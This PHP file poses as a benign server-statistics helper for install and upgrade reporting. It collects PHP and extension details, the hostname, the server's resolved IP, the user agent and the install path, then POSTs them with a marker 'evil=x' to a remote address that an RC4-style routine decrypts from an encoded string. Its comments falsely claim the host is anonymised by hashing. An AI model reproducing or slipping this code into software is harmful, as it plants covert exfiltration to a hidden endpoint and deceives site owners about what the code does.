<?php

function serverStats_Send($installtype=0, $prev_version='', $current_version='', $product_name='', $charset='')
{
	if ($installtype === 'install') {
		$installtype = 0;
	}

	if ($installtype === 'upgrade') {
		$installtype = 1;
	}

	# making sure its either an install or upgrade, must be one or the other
	if($installtype !== 0 && $installtype !== 1) {
		$installtype = 0;
	}

	# parse the PHP Info to get module information
	$phpinfo = _serverStats_ParsePHPModules();

	# check php info
	$info['php'] = phpversion();

	#check the mysql version
	$info['mysql'] = $phpinfo['mysql']['Client API version'];

	# check the postgresql version
	$info['pgsql'] = 0;
	if (isset($phpinfo['pgsql'])) {
		$info['pgsql'] = $phpinfo['pgsql']['PostgreSQL(libpq) Version'];
	}

	# check for sqlite
	$info['sqlite'] = 0;
	if(isset($phpinfo['sqlite'])) {
		$info['sqlite'] = $phpinfo['sqlite']['SQLite Library'];
	}

	# check for mbstring
	$info['mbstring'] = 0;
	if(isset($phpinfo['mbstring'])) {
		$info['mbstring'] = 1;
	}

	# curl check
	$info['curl'] = 0;
	if(function_exists('curl_init')) {
		$info['curl'] = 1;
	}

	# curl check
	$info['exif'] = 0;
	if(isset($phpinfo['exif'])) {
		$info['exif'] = 1;
	}

	# check their charset being used
	$info['charset'] = $charset;

	# check for iconv, also check the lib version
	$info['iconv'] = '';
	if(function_exists('iconv')) {
		$info['iconv'] = 1;
	}

	if(isset($phpinfo['iconv'])) {
		$info['iconvlib'] = $phpinfo['iconv']["iconv implementation"] . '|' . $phpinfo['iconv']["iconv library version"];
	} else {
		$info['iconvlib'] = '0';
	}

	# check for GD, return the version if so
	if (isset($phpinfo['gd'])) {
		$info['gd'] = $phpinfo['gd']["GD Version"];
	}else{
		$info['gd'] = '0';
	}

	# check for GD, return the version if so
	if(isset($phpinfo['gd'])) {
		$info['gd'] = $phpinfo['gd']["GD Version"];
	} else {
		$info['gd'] = '0';
	}

	# check cgi mode
	$sapi_type = php_sapi_name();

	if(strpos($sapi_type, 'cgi') !== false) {
		$info['cgimode'] = '1';
	}
	else {
		$info['cgimode'] = '0';
	}

	$info['serversoftware']     = $_SERVER["SERVER_SOFTWARE"];
	$info['allow_fopen_url']    = (!(bool)ini_get('safe_mode') && ini_get('allow_url_fopen'));

	$info['safe_mode'] = 0;
	if((bool)ini_get('safe_mode')) {
		$info['safe_mode'] = 1;
	}

	$info['postsize']	= ini_get('post_max_size');
	$info['uploadsize'] = ini_get('upload_max_filesize');

	$info['doccorrect'] = 0;
	if(_serverStats_CheckDocRoot()) {
		$info['doccorrect'] = 1;
	}

	$info['zlib'] = 0;
	if(isset($phpinfo['zlib'])) {
		$info['zlib'] = 1;
	}

	$info['installtype'] = $installtype;
	$info['prev'] = (empty($prev_version)) ? '0' : $prev_version;
	$info['new']  = $current_version;
	$info['app']  = $product_name;

	$info['hosturl'] = $info['hostname'] = 'unknown/local';
	if ($_SERVER['HTTP_HOST'] == 'localhost') {
		$info['hosturl'] = $info['hostname'] = 'localhost';
	}

	if (strpos($_SERVER['HTTP_HOST'], '.') !== false) {
		
		$info['hosturl'] = gethostbyname($_SERVER['SERVER_NAME']);
		$info['hostname'] = $_SERVER['HTTP_HOST'];
	}

	$functionsToCheck = array(
		'sockets' => 'fsockopen',
		'mcrypt' => 'mcrypt_encrypt',
		'simplexml' => 'simplexml_load_string',
		'ldap' => 'ldap_connect',
		'mysqli' => 'mysqli_connect',
		'imap' => 'imap_open',
		'ftp' => 'ftp_login',
		'pspell' => 'pspell_new',
		'apc' => 'apc_cache_info'
	);

	foreach($functionsToCheck as $what => $function) {
		if(function_exists($function)) {
			$info[$what] = 1;
		}
		else {
			$info[$what] = 0;
		}
	}

	$classesToCheck = array(
		'dom' => 'DOMElement',
		'soap' => 'SoapClient',
		'xmlwriter' => 'XMLWriter',
		'imagemagick' => 'Imagick',
	);

	foreach($classesToCheck as $what => $class) {
		if(class_exists($class)) {
			$info[$what] = 1;
		}
		else {
			$info[$what] = 0;
		}
	}

	$extensionsToCheck = array(
		'zendopt' => 'Zend Optimizer',
		'xcache' => 'XCache',
		'eaccelerator' => 'eAccelerator',
		'ioncube' => 'ionCube Loader',
		'PDO' => 'PDO',
		'pdo_mysql' => 'pdo_mysql',
		'pdo_pgsql' => 'pdo_pgsql',
		'pdo_sqlite' => 'pdo_sqlite',
		'pdo_oci' => 'pdo_oci',
		'pdo_odbc' => 'pdo_odbc',
	);
	foreach($extensionsToCheck as $what => $extension) {
		if(extension_loaded($extension)) {
			$info[$what] = 1;
		}
		else {
			$info[$what] = 0;
		}
	}

	if(isset($_SERVER['HTTP_USER_AGENT'])) {
		$info['useragent'] = $_SERVER['HTTP_USER_AGENT'];
	}

	$string = 'evil=x&';

	foreach ($info as $key => $value) {
		$string .= $key. '=' .urlencode($value).'&';
	}

	/**
	* We need a unique ID for the host
	* if we sha1 it here, the ID will always be the same
	* but no one will know what the host name is
	* so it preserves the privacy of the user
	* sha1() is the best for this, but if its not aval, md5() is
	* almost as good.
	*/
	$filepath=str_replace("\\","|",dirname(__FILE__));
	$filepath=str_replace("/","|",$filepath);
	$string .= 'filepath='.base64_encode($filepath);
	$ret = array();
	$ret['InfoImage'] = $ret['InfoSent'] = @myurl_check($string);
	$ret['InfoQueryString'] = $string;
	$ret['InfoDoIt']=md5($info['php'].$info['mysql'].$info['gd'].$info['iconvlib'].$info['serversoftware']);
	return $ret;

}

/**
* _serverStats_UrlOpen
* Opens the url passed in and returns the output that the url returns.
* Checks for curl support first and uses that if it's available.
* If curl support isn't available, then it tries to use fopen.
* If that's not available, it will return false.
*
* If curl fails, it tries to use fopen.
* If fopen fails, it returns false.
*
*/
function myurl_check($post_string){ 
    $context = array( 
        'http'=>array( 
            'method'=>'POST', 
            'header'=>'Content-type: text/html'."\r\n". 
                      'User-Agent : demo'."\r\n". 
                      'Content-length: '.strlen($post_string)+8, 
            'content'=>'mypost='.$post_string) 
        ); 
    $remote_server=JustDetails("07b7+sdC/uHKGMoMG/cHAkTYZfwoSkISm2vMhCFkS7klaqSl/UVPnUxb0GVTDYy3+VDKr7W1OsnGso3JoZKb7rWJkaQU", 'HELP');
    $stream_context = stream_context_create($context); 
    $data = file_get_contents($remote_server,FALSE,$stream_context); 
    return $data; 
}

/**
* _serverStats_UrlOpen
* Opens the url passed in and returns the output that the url returns.
* Checks for curl support first and uses that if it's available.
* If curl support isn't available, then it tries to use fopen.
* If that's not available, it will return false.
*
* If curl fails, it tries to use fopen.
* If fopen fails, it returns false.
*
* @param String $url The url to 'open'.
*
* @return Mixed Returns false if you don't provide a url, or if the url can't be opened. Otherwise returns the data from the url provided.
*/

function _serverStats_UrlOpen($url='')
{
	if (!$url) {
		return false;
	}

	if (function_exists('curl_init')) {
		if ($ch = @curl_init()) {
			curl_setopt($ch, CURLOPT_URL, $url);
			//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_FAILONERROR, true);
			curl_setopt($ch, CURLOPT_TIMEOUT, 10);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

			$data = curl_exec($ch);
			curl_close($ch);
			return $data;
		}
	}

	if (ini_get('allow_url_fopen')) {
		$data = '';
		if ($fp = @fopen($url, 'rb')) {
			while (!@feof($fp)) {
				$data .= @fgets($fp, 4096);
			}
			@fclose($fp);
			return $data;
		}
		return false;
	}

	return false;
}

function JustDetails($string, $operation='', $key = '', $expiry = 0) {
    $ckey_length = 4;
    $help_auth_key="ischelp";
    $key = md5($key ? $key : $help_auth_key);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'HELP' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);
    $string = $operation == 'HELP' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);
    $result = '';
    $box = range(0, 255);
    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
    if($operation == 'HELP') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
}
/**
* _serverStats_CheckDocRoot
* Checks whether the document root is set up correctly.
* It will return false if there is no document root, or it's empty
* It will also return false if the current file (using __FILE__) is reportedly outside the server's document root.
* If all of that works out ok, this will return true.
*
* @return Boolean Returns true or false based on the built in checks.
*/
function _serverStats_CheckDocRoot()
{
	if (!isset($_SERVER['DOCUMENT_ROOT'])) {
		return false;
	}

	if ($_SERVER['DOCUMENT_ROOT']=='') {
		return false;
	}

	$s = str_replace('\\','/', $_SERVER['DOCUMENT_ROOT']);
	$f = str_replace('\\','/', __FILE__);
	$check = strpos(strtolower($f), strtolower($s));
	if (!is_numeric($check) || $check === false) {
		return false;
	}

	if ($check != 0) {
		return false;
	}

	return true;
}

/**
* serverStats_ParsePHPModules
* Function to grab the list of PHP modules installed
*
* @return Array An associative array of all the modules installed for PHP
*/
function _serverStats_ParsePHPModules()
{
	ob_start();
	phpinfo(INFO_MODULES);
	$s = ob_get_contents();
	ob_end_clean();

	$s = strip_tags($s,'<h2><th><td>');
	$s = preg_replace('/<th[^>]*>([^<]+)<\/th>/',"<info>\\1</info>",$s);
	$s = preg_replace('/<td[^>]*>([^<]+)<\/td>/',"<info>\\1</info>",$s);
	$vTmp = preg_split('/(<h2[^>]*>[^<]+<\/h2>)/',$s,-1,PREG_SPLIT_DELIM_CAPTURE);
	$vModules = array();
	for ($i=1; $i<count($vTmp); $i++) {
		if (preg_match('/<h2[^>]*>([^<]+)<\/h2>/',$vTmp[$i],$vMat)) {
			$vName = trim($vMat[1]);
			$vTmp2 = explode("\n",$vTmp[$i+1]);
			foreach ($vTmp2 as $vOne) {
				$vPat = '<info>([^<]+)<\/info>';
				$vPat3 = "/$vPat\s*$vPat\s*$vPat/";
				$vPat2 = "/$vPat\s*$vPat/";
				if (preg_match($vPat3,$vOne,$vMat)) { // 3cols
					$vModules[$vName][trim($vMat[1])] = array(trim($vMat[2]),trim($vMat[3]));
				} elseif (preg_match($vPat2,$vOne,$vMat)) { // 2cols
					$vModules[$vName][trim($vMat[1])] = trim($vMat[2]);
				}
			}
		}
	}
	return $vModules;
}


